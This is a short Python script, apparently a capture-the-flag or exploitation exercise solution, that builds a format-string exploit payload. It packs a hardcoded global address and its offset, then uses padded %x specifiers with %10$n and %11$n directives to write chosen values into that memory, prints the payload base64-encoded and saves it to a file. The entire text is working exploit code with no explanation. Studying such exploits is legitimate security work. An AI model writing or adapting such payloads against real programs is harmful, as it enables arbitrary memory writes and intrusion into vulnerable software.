import struct
from base64 import b64encode

global_addr = 0x080497e0

payload = b""
payload += struct.pack("I", global_addr)
payload += struct.pack("I", global_addr+2)
payload += ("%{}x".format(55438-8)).encode()
payload += "%10$n".encode()
payload += ("%{}x".format(65535-55438)).encode()
payload += "%11$n".encode()

print(b64encode(payload).decode())

with open ("payload", "wb") as f:
    f.write(payload)
